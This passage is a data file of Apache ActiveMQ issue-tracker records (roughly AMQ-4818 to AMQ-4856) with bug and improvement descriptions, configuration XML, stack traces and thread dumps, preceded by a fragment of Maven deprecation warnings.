deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/SetHeaderTest.java:&#91;37,35&#93; &#91;deprecation&#93; AbstractJUnit38SpringContextTests in org.springframework.test.context.junit38 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/CamelRedeliveryTest.java:&#91;38,47&#93; &#91;deprecation&#93; AbstractJUnit38SpringContextTests in org.springframework.test.context.junit38 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/CamelRedeliveryTest.java:&#91;44,41&#93; &#91;deprecation&#93; AbstractJUnit38SpringContextTests in org.springframework.test.context.junit38 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/JmsJdbcXATest.java:&#91;34,35&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/JmsJdbcXATest.java:&#91;47,35&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/component/ActiveMQConfigureTest.java:&#91;86,59&#93; &#91;deprecation&#93; CamelLogger in org.apache.camel.processor has been deprecated
issueID:AMQ-4818
type:Improvement
changed files:
texts:Update JMX views for transport connector
Updating the JMX view for transport connectors will provide more visibility to configuration settings
issueID:AMQ-4819
type:Improvement
changed files:BrokerService.java
texts:Reducing memory usage should log at INFO/WARN level instead of ERROR
For example when using unit tests we will see. There is other limits that is being logged as well such as when disk space is also less than expected. That is logged at INFO level AFAIR2013-10-22 10:24:44,002 &#91;main           &#93; ERROR BrokerService                  - Memory Usage for the Broker (1024 mb) is more than the maximum available for the JVM: 156 mb - resetting to 70% of maximum available: 109 mbI suggest to make this logging level INFO or maybe at WARN?
issueID:AMQ-4820
type:Bug
changed files:
texts:runtime config - namespace prefix causes npe on config load
With namespace prefix - the broker node cannot be resolved in the xml config and the runtime config plugin errors out.java.lang.IllegalArgumentException: Unexpected node type: null at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:311) at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal(UnmarshallerImpl.java:284) at org.apache.activemq.plugin.RuntimeConfigurationBroker.loadConfiguration(RuntimeConfigurationBroker.java:662) at org.apache.activemq.plugin.RuntimeConfigurationBroker.start(RuntimeConfigurationBroker.java:142) at org.apache.activemq.broker.BrokerService$5.start(BrokerService.java:2144) at org.apache.activemq.broker.BrokerService.doStartBroker(BrokerService.java:648) at org.apache.activemq.broker.BrokerService.startBroker(BrokerService.java:632) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:568) at org.apache.activemq.RuntimeConfigTestSupport.startBroker(RuntimeConfigTestSupport.java:52)xml of the form:<tag0:beans xmlns:tag0="http://www.springframework.org/schema/beans"            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"            xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd">  <tag0:bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">    <tag0:property name="properties">      <tag0:bean class="org.apache.activemq.CustomPropertiesBean"/>    </tag0:property>  </tag0:bean>  <amq:broker xmlns:amq="http://activemq.apache.org/schema/core" start="false" dataDirectory="${data}" persistent="false"              brokerName="${broker-name}">    <amq:destinationPolicy>      <amq:policyMap>        <amq:policyEntries>          <amq:policyEntry topic=">" producerFlowControl="true">            <amq:pendingMessageLimitStrategy>              <amq:constantPendingMessageLimitStrategy limit="1000"/>            </amq:pendingMessageLimitStrategy>          </amq:policyEntry>          <amq:policyEntry queue=">" producerFlowControl="true" memoryLimit="1mb"/>        </amq:policyEntries>      </amq:policyMap>    </amq:destinationPolicy>    <amq:managementContext>      <amq:managementContext createConnector="false"/>    </amq:managementContext>    <amq:plugins>      <amq:jaasAuthenticationPlugin configuration="karaf"/>      <amq:runtimeConfigurationPlugin checkPeriod="1000"/>    </amq:plugins>    <amq:systemUsage>      <amq:systemUsage>        <amq:memoryUsage>          <amq:memoryUsage limit="64 mb"/>        </amq:memoryUsage>        <amq:storeUsage>          <amq:storeUsage limit="100 gb"/>        </amq:storeUsage>        <amq:tempUsage>          <amq:tempUsage limit="50 gb"/>        </amq:tempUsage>      </amq:systemUsage>    </amq:systemUsage>    <amq:transportConnectors>      <amq:transportConnector name="openwire" uri="tcp://0.0.0.0:0?maximumConnections=1000"/>    </amq:transportConnectors>  </amq:broker></tag0:beans>
issueID:AMQ-4821
type:Improvement
changed files:
texts:runtime config - add support for spring properties config with properties or bean factory
PropertyPlaceholderConfigurer with property files (resources) works ok, but with a customer beanfactory or  properties bean, they are ignored atm.This should be supported. eg:<tag0:beans xmlns:tag0="http://www.springframework.org/schema/beans"            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"            xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd">  <tag0:bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">    <tag0:property name="properties">      <tag0:bean class="org.apache.activemq.CustomPropertiesBean"/>    </tag0:property>  </tag0:bean>...
issueID:AMQ-4822
type:Test
changed files:
texts:DynamicallyIncludedDestinationsDuplexNetworkTest.testDynamicallyIncludedDestinationsForDuplex fails on EC2 boxes
This test fails on EC2 boxes because they have /etc/hosts which contain and entry "127.0.0. localhost.localdomain localhost" rather than "127.0.0.1 localhost".  Therefore the remoteBroker.getTransportConnectorByName("tcp://localhost:61617) call in DynamicallyIncludedDestinationsDuplexNetworkTest.getDuplexBridgeFromConnection fails because that connector is stored as "tcp://localhost.localdomain:61617"
issueID:AMQ-4823
type:Bug
changed files:
texts:NetworkConnector not registered in JMX when created from Broker View
When programmatically (or through JConsole) trying to add a network connect, the connector does get properly added and started, but it does not get registered in the JMX MBean tree so there is not introspection MBean support.
issueID:AMQ-4825
type:Improvement
changed files:
texts:ConnectionFactory and ActiveMQCamelComponent should default to the right port if on OpenShift
our default is localhost:61616 out of the box. Though this doesn"t work on OpenShift - where we default to using 31313 so its in the allowable range.When Java is running in the openshift cartridge we can easily tell using an environment variable; so it"d be nice if we automatically checked for that and defaulted to it out of the box. Then a vanilla ActiveMQ connection factory or camel component would automatically just use the right port on openshift. (Then if we"re using, say, a local broker or gateway, it"d just work).Here"s where the port/env var gets defined:https://github.com/jboss-fuse/fuse-openshift-cartridge/blob/master/metadata/manifest.yml#L94So we"d just need to check for the env value of OPENSHIFT_FUSE_AMQ_PORT and use that if its defined otherwise default to 61616
issueID:AMQ-4826
type:Improvement
changed files:FailoverTransport.java
texts:Avoid unnecessary remainder operator for floating-point
I installed jdk-7u45-linux-arm-vfp-sflt.tar.gz on my pandaboard, and found that this jdk has a problem of remainder operator for floating point. So, if you starts ActiveMQ in above environment, you might encounter IndexOutOfBoundsException at  org.apache.activemq.transport.failover.FailoverTransport.getConnectList(FailoverTransport.java:779)This is because  int p = (int) (Math.random() * 100 % l.size());above p gets larger number than "l.size" contrary to your expectation. This problem doesn"t occur in case of x86 Architecture or ARM Hardfloat JDK.This is a problem of ARM Softfloat JDK, but I think it"s better to avoid unnecessary remainder operator for floating-point for safety. So,   int p = ((int) Math.random() * 100) % l.size();would be better than current one.
issueID:AMQ-4829
type:Bug
changed files:DstatCommand.java
texts:activemq:dstat command can throw error for topic subscriptions views
You can get errors likeactivemq:dstatName                                                Queue Size  Producer #  Consumer #   Enqueue #   Dequeue #    Memory %foo                                                        105           0           0         105           0          11ActiveMQ.Advisory.Queue                                      0           0           0           1           0           0ActiveMQ.Advisory.MasterBroker                               0           0           0           1           0           0ActiveMQ.Advisory.Connection                                 0           0           0           1           0           0ERROR: java.lang.RuntimeException: Failed to execute dstat task. Reason: java.lang.reflect.UndeclaredThrowableExceptionjava.lang.RuntimeException: Failed to execute dstat task. Reason: java.lang.reflect.UndeclaredThrowableException at org.apache.activemq.console.command.DstatCommand.runTask(DstatCommand.java:78) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.AbstractJmxCommand.execute(AbstractJmxCommand.java:387) at org.apache.activemq.karaf.commands.ActiveMQCommandSupport.doExecute(ActiveMQCommandSupport.java:46) at org.apache.karaf.shell.console.OsgiCommandSupport.execute(OsgiCommandSupport.java:39) at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:35) at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78) at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477) at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403) at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120) at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:89) at org.apache.karaf.shell.console.jline.Console.run(Console.java:174) at org.apache.karaf.shell.console.jline.DelayedStarted.run(DelayedStarted.java:61)Error executing command: java.lang.reflect.UndeclaredThrowableExceptionAlso the dstat should sort the listing first, so they are listed A..Z
issueID:AMQ-4831
type:Improvement
changed files:BrokerView.java
BrokerViewMBean.java
texts:Average message size attribute on broker mbean should not have decimals
This doesn"t look very nice when looking from a jmx console such as hawtio.See screenshot, and notice the many decimals the average message size attribute has.
issueID:AMQ-4832
type:Bug
changed files:BrokerService.java
texts:Broker limits store space, not taking into account what it&#39;s already using
https://issues.apache.org/jira/browse/AMQ-4638 sets the usage limit of a store to only the available disk space. It does not take into account that the store itself is using space on the disk.In our environment the store was taking 30 GB of space and there was 17 GB free on disk. Therefore, on startup the store was limited to 17 GB; where it should have been limited to 47 GB. Because of this, by design, no new message can be added to the queue.
issueID:AMQ-4837
type:Bug
changed files:
texts:LevelDB corrupted when in a replication cluster
I have clustered 3 ActiveMQ instances using replicated leveldb and zookeeper. When performing some tests using Web UI, I can across issues that appears to corrupt the leveldb data files.The issue can be replicated by performing the following steps:1. Start 3 activemq nodes.2. Push a message to the master (Node1) and browse the queue using the web UI3. Stop master node (Node1)4. Push a message to the new master (Node2) and browse the queue using the web UI. Message summary and queue content ok.5. Start Node16. Stop master node (Node2)7. Browse the queue using the web UI on new master (Node3). Message summary ok however when clicking on the queue, no message details. An error (see below) is logged by the master, which attempts a restart.From this point, the database appears to be corrupted and the same error occurs to each node infinitely (shutdown/restart). The only way around is to stop the nodes and clear the data files.However when a message is pushed between step 5 and 6, the error doesn’t occur.=================================Leveldb configuration on the 3 instances:  <persistenceAdapter>   <replicatedLevelDB     directory="${activemq.data}/leveldb"     replicas="3"     bind="tcp://0.0.0.0:0"     zkAddress="zkserver:2181"     zkPath="/activemq/leveldb-stores"     />  </persistenceAdapter>=================================The error is:INFO | Stopping BrokerService&#91;localhost&#93; due to exception, java.io.IOExceptionjava.io.IOException        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:39)        at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:543)        at org.apache.activemq.leveldb.LevelDBClient.might_fail_using_index(LevelDBClient.scala:974)        at org.apache.activemq.leveldb.LevelDBClient.collectionCursor(LevelDBClient.scala:1270)        at org.apache.activemq.leveldb.LevelDBClient.queueCursor(LevelDBClient.scala:1194)        at org.apache.activemq.leveldb.DBManager.cursorMessages(DBManager.scala:708)       at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.recoverNextMessages(LevelDBStore.scala:741)        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:106)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:258)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:108)        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)        at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1875)        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:2086)        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1581)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)        at java.lang.Thread.run(Thread.java:722)Caused by: java.lang.NullPointerException        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1198)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1194)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1$$anonfun$apply$mcV$sp$12.apply(LevelDBClient.scala:1272)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1$$anonfun$apply$mcV$sp$12.apply(LevelDBClient.scala:1271)        at org.apache.activemq.leveldb.LevelDBClient$RichDB.check$4(LevelDBClient.scala:315)        at org.apache.activemq.leveldb.LevelDBClient$RichDB.cursorRange(LevelDBClient.scala:317)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply$mcV$sp(LevelDBClient.scala:1271)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply(LevelDBClient.scala:1271)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply(LevelDBClient.scala:1271)        at org.apache.activemq.leveldb.LevelDBClient.usingIndex(LevelDBClient.scala:968)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$might_fail_using_index$1.apply(LevelDBClient.scala:974)        at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:540)        ... 17 more
issueID:AMQ-4839
type:Task
changed files:
texts:deprecated JMS streams
This featurehttp://activemq.apache.org/jms-streams.htmlIs seldom used and its not good practice with streaming types in a message broker.For large payloads people can use out of bands transports such as the FTP or whatnot.
issueID:AMQ-484
type:Bug
changed files:BrokerService.java
texts:discoveryUri not recorded on TransportConnector when JMX in use
When transport connector as follows is defined<transportConnector uri="tcp://localhost:61616" discoveryUri="multicast://default"/>in conjuction with the broker definition of:<broker useJmx="true" />The resulting TransportConnector created by XBeans from the defintion is provided with the discoveryUri.  However, the BrokerService then replaces that instance with ManagedTransportConnector instance but does not transfer the discoveryUri.  The result is no discovery agent is created for the connector when the connector is started.
issueID:AMQ-4840
type:Bug
changed files:StompFrame.java
texts:Invalid STOMP frame sent on websocket connections with heartbeats.
a KEEPALIVE frame was being sent by ActiveMQ to stomp websocket clients that enabled heartbeats.
issueID:AMQ-4841
type:Bug
changed files:
texts:lease-database-locker does not use the configured tablePrefix in UPDATE statement
Using the configuration<persistenceAdapter>  <jdbcPersistenceAdapter dataDirectory="${activemq.data}" dataSource="#mysql-ds" lockKeepAlivePeriod="5000">    <locker>      <lease-database-locker lockAcquireSleepInterval="10000"/>    </locker>    <statements>      <statements tablePrefix="TTT_" messageTableName="AMQ_MSGS" durableSubAcksTableName="AMQ_ACKS" lockTableName="AMQ_LOCK"/>    </statements>    <adapter>       <mysql-jdbc-adapter/>     </adapter>  </jdbcPersistenceAdapter></persistenceAdapter>The logging show the Lock table was created WITH the configured prefix but the lease locker UPDATE statement does not use that prefix2013-10-30 14:33:03,245 | DEBUG | Executing SQL: CREATE TABLE TTT_AMQ_LOCK( ID BIGINT NOT NULL, TIME BIGINT, BROKER_NAME VARCHAR(250), PRIMARY KEY (ID) ) ENGINE=INNODB | org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter | main...2013-10-30 14:33:10,889 | DEBUG | jdbcBroker, lease keepAlive Query is UPDATE ACTIVEMQ_LOCK SET BROKER_NAME=?, TIME=? WHERE BROKER_NAME=? AND ID = 1 | org.apache.activemq.store.jdbc.LeaseDatabaseLocker | ActiveMQ JDBC PA Scheduled Task
issueID:AMQ-4842
type:Test
changed files:
texts:activemq-unit-tests - A test keep failing testVirtualTopicFailover
Failed tests:   testVirtualTopicFailover(org.apache.activemq.broker.ft.kahaDbJdbcLeaseQueueMasterSlaveTest): Get message after failover
issueID:AMQ-4843
type:Improvement
changed files:
texts:runtime config - support addition of composite virtual destinations - forwardTo
Add support for runtime additions of the form:<destinationInterceptors><virtualDestinationInterceptor><virtualDestinations>      <compositeQueue name="VirtualDestination.CompositeQueue">        <forwardTo>          <queue physicalName="VirtualDestination.QueueConsumer"/>          <topic physicalName="VirtualDestination.TopicConsumer"/>        </forwardTo>      </compositeQueue></virtualDestinations></virtualDestinationInterceptor></destinationInterceptors>currently composite dest runtime addition results in NPE:Caused by: java.lang.NullPointerException at org.apache.activemq.broker.region.virtual.CompositeDestinationFilter.send(CompositeDestinationFilter.java:53) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:394) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:442) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:283) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:147) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:307) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:147) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:147) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:152) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:467) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:751) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)..
issueID:AMQ-4844
type:Improvement
changed files:
texts:Provide more granular karaf features
Right now we have just one feature file with all things activemq. I"d like to split them in two separate feature files, one with core features and other with distribution-like features that includes configuration and web console.
issueID:AMQ-4849
type:Improvement
changed files:
texts:runtime config - support modifications to simpleAuthenticationPlugin plugin
it makes sense to support mods to the simpleAuthenticationPlugin users considering we support mods to the simpleAuthorization plugin. If the broker user permissions are  locked down it is a reasonable approach.
issueID:AMQ-4852
type:Improvement
changed files:
texts:Show clientId view of duplex network connection Mbeans
from http://mail-archives.apache.org/mod_mbox/activemq-users/201311.mbox/%3C35EC11A1-A490-4942-86D8-1238EA085DC3@schubergphilis.com%3Ewith duplex=true we only have the clientip view, the connectionInfo bypasses the initiating connection b/c that is now bridging to the local broker.I think we can fix this.
issueID:AMQ-4853
type:Bug
changed files:ConsumerInfo.java
texts:Advisory support leads to excessive CPU usage
After upgrading from AMQ 5.8 to 5.9 we have seen cpu usage continually climb until AMQ threads are taking nearly all of the CPU Resources while remaining fairly idle. This is just a single broker with advisory support on. (Advisory support is on in this case as we run the same config for a network of brokers.) Turning off advisory support reduced the CPU load to single digits.top -H output:Cpu(s): 97.8%us,  2.1%sy,  0.0%ni,  0.0%id,  0.0%wa,  0.0%hi,  0.1%si,  0.0%stMem:   7872040k total,  6574324k used,  1297716k free,   301028k buffersSwap:        0k total,        0k used,        0k free,  1635392k cached  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                                                                          25476 root      16   0 2173m 891m  11m R 14.4 11.6  86:12.10 java                                                                                                                                              25472 root      15   0 2173m 891m  11m R 13.6 11.6  86:09.77 java                                                                                                                                              25155 root      16   0 2173m 891m  11m R  9.8 11.6  86:26.13 java                                                                                                                                              25471 root      16   0 2173m 891m  11m R  9.2 11.6  86:12.93 java                                                                                                                                              25514 root      16   0 2173m 891m  11m R  9.2 11.6  86:15.12 java                                                                                                                                              25202 root      16   0 2173m 891m  11m R  8.7 11.6  86:33.20 java                                                                                                                                              25189 root      16   0 2173m 891m  11m S  8.4 11.6  86:24.65 java                                                                                                                                              25274 root      16   0 2173m 891m  11m R  8.1 11.6  86:18.45 java                                                                                                                                              19272 root      15   0 2173m 891m  11m S  8.1 11.6   8:40.19 java                                                                                                                                              20039 root      15   0 2173m 891m  11m S  8.1 11.6   8:15.53 java                                                                                                                                              19270 root      15   0 2173m 891m  11m R  7.8 11.6   8:35.85 java                                                                                                                                              25134 root      16   0 2173m 891m  11m R  7.5 11.6  90:42.29 java                                                                                                                                              25259 root      15   0 2173m 891m  11m R  7.5 11.6  90:30.02 java                                                                                                                                              25474 root      16   0 2173m 891m  11m R  7.5 11.6  86:13.24 java                                                                                                                                              25475 root      16   0 2173m 891m  11m R  7.5 11.6  86:11.74 java                                                                                                                                              25483 root      16   0 2173m 891m  11m R  7.5 11.6  86:12.30 java                                                                                                                                              25210 root      15   0 2173m 891m  11m R  7.2 11.6  90:35.24 java                                                                                                                                              25129 root      16   0 2173m 891m  11m S  6.9 11.6  90:31.27 java                                                                                                                                              25249 root      16   0 2173m 891m  11m S  6.9 11.6  86:18.35 java                                                                                                                                              25489 root      16   0 2173m 891m  11m R  6.9 11.6  86:16.93 java                                                                                                                                               9971 root      15   0 2173m 891m  11m S  6.6 11.6  38:53.66 java                                                                                                                                              25116 root      16   0 2173m 891m  11m R  6.3 11.6  90:28.39 java                                                                                                                                              25513 root      16   0 2173m 891m  11m R  6.3 11.6  86:07.62 java    Thread dump snippets:PID 25476 &#8211;"ActiveMQ Transport: tcp:///10.33.154.95:48799@61616" daemon prio=10 tid=0x00002aaaf5288800 nid=0x6384 runnable &#91;0x00000000489b1000&#93;   java.lang.Thread.State: RUNNABLE at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346) at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270) at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132) at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132) at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137) at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619) at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:619)PID - 25473"ActiveMQ Transport: tcp:///10.33.154.95:48802@61616" daemon prio=10 tid=0x00002aaaf6afc800 nid=0x6381 runnable &#91;0x000000004779f000&#93;   java.lang.Thread.State: RUNNABLE at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346) at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270) at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132) at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132) at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137) at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619) at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:619)PID 25471 &#8211;"ActiveMQ Transport: tcp:///10.33.154.95:48803@61616" daemon prio=10 tid=0x00002aaaf6f4b800 nid=0x6380 runnable &#91;0x00000000487af000&#93;   java.lang.Thread.State: RUNNABLE at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346) at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270) at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132) at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132) at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137) at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619) at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-4854
type:Bug
changed files:
texts:JmsRollbackRedeliveryTest.testRedeliveryWithPrefetch1 fails intermittently
This tests fails on some CI boxes and slow machinesjavax.jms.JMSException: peer (vm://localhost#5) stopped. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1405) at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1510) at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:524) at org.apache.activemq.JmsRollbackRedeliveryTest.doTestRedelivery(JmsRollbackRedeliveryTest.java:84) at org.apache.activemq.JmsRollbackRedeliveryTest.testRedeliveryWithPrefetch1(JmsRollbackRedeliveryTest.java:76) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:601) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:601) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110) at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175) at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)Caused by: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://localhost#5) stopped. at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:205) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132) at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:1071) at org.apache.activemq.broker.TransportConnection$4.run(TransportConnection.java:1037) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:722)
issueID:AMQ-4855
type:Bug
changed files:
texts:Typos in SubscriptionInfo
The typos in properties "subcriptionId" and "subcriptionName" require changes in multiple classes, but should be fixed, even if only in a major release.
issueID:AMQ-4856
type:Improvement
changed files:MessageServlet.java
texts:Change MIME type for XML in the REST API
